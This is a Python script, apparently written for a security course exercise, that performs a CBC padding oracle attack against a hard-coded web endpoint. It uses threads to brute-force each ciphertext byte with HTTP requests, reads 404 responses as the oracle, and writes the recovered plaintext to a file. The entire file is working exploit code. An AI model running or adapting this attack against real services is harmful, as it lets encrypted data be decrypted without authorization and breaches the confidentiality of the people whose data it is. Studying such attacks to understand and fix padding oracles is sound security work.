import sys
from codecs import decode
from codecs import encode
import requests
import threading
# References:
# https://robertheaton.com/2013/07/29/padding-oracle-attack/
# https://www.youtube.com/watch?v=aH4DENMN_O4
# https://blog.cloudflare.com/padding-oracles-and-the-decline-of-cbc-mode-ciphersuites/
# https://jiang-zhenghong.github.io/blogs/PaddingOracle.html

RED         = "\033[30m"
GREEN       = "\033[32m"
BLUE        = "\033[34m"
LIGHTBLUE   = "\033[94m"
PURPLE      = "\033[35m"
RESET       = "\033[0m"
def set_color(color):
    print('{}'.format(color),end='')
    return 0

SIZE = 16
host = b'http://192.17.103.142:8080/mp3/mgg2/?'
EMPTY_BLOCK = list([0]*SIZE)
def pad(msg):
    n = len(msg)%16
    return msg + ''.join(chr(i) for i in range(16,n,-1))

def thread_launcher(fn, state,tid):
    rvs[tid-1] = fn(state,tid,exploit(state,tid))
    return True

# xor each byte of the cipher block with the padding block from the oracle
# to get the plaintext block
def decrypt(state,idx,decoy):
    cipherblock = [int(encode(bytes([e]),'hex'),16) for e in state[idx-1]]

    # xor corresponding bytes from decoy block and previous cipherblock
    decrypted = [cipherblock[i]^decoy[i] for i in range(len(decoy))]
    return decrypted

def exploit(state,idx):
    if idx >= len(state):
        return list(EMPTY_BLOCK)
    cipherblock = encode(state[idx],'hex')
    decoy = list(EMPTY_BLOCK)
    for i in reversed([e for e in range(SIZE)]):
        next_iter = False
        set_color(BLUE)
        print('bruteforcing byte: {}/{}'.format(i,15))
        set_color(RESET)

        # generate the padding based on byte position
        crypt = pad(''.join([chr(e) for e in list(EMPTY_BLOCK)[:i]])).encode()
        guess = list(EMPTY_BLOCK)
        # xor the padding bytes
        for j in range(i+1,SIZE):
            guess[j] = crypt[j]^decoy[j]
        
        # xor the padding byte with the byte from the oracle
        for g in range(1<<8):
            guess[i] = g
            cipher = b''.join([encode(bytes([k]),'hex') for k in guess])
            resp = requests.get(host+cipher+cipherblock)
            if resp.status_code == requests.codes.not_found:
                # oracle says cipher was not padded correctly, encode guess into the decoy block
                decoy[i] = guess[i]^crypt[i]
                next_iter = True
                break
        if next_iter:
            continue
    return decoy

# Parse command-line args
if len(sys.argv) < 3:
    set_color(RED)
    print('error: need 2 arguments')
    set_color(RESET)
    exit()

# create file pointers for I/O
fp = open(sys.argv[1],'r')
outfile = open(sys.argv[2],'w')
contents = fp.readline()
fp.close()

# Book-keeping stuff 
ciphertext = decode(contents,'hex')
n_blocks = len(ciphertext)//SIZE
N_THREADS = n_blocks
threads = [None]*N_THREADS
rvs = [None]*N_THREADS

# Break ciphertext into 128-bit blocks
blocks = [ciphertext[(i)*SIZE:(i+1)*SIZE] for i in range(n_blocks)]

# Launch many threads or else it takes a long time...
for i in range(1,len(threads)+1):
    threads[i-1] = threading.Thread(target=thread_launcher, args=(decrypt,blocks,i))
    threads[i-1].start()

# Join the threads
for i in range(1,len(threads)+1):
    threads[i-1].join()

# Construct plaintext string
out = ''
for l in range(0,len(rvs)):
    out += ''.join([chr(e) for e in rvs[l]])
out = out[:out.index(chr(0x10))]

set_color(GREEN)
print('got: {}'.format(out))
set_color(RESET)

# Write to output file
outfile.write(out)
outfile.close()
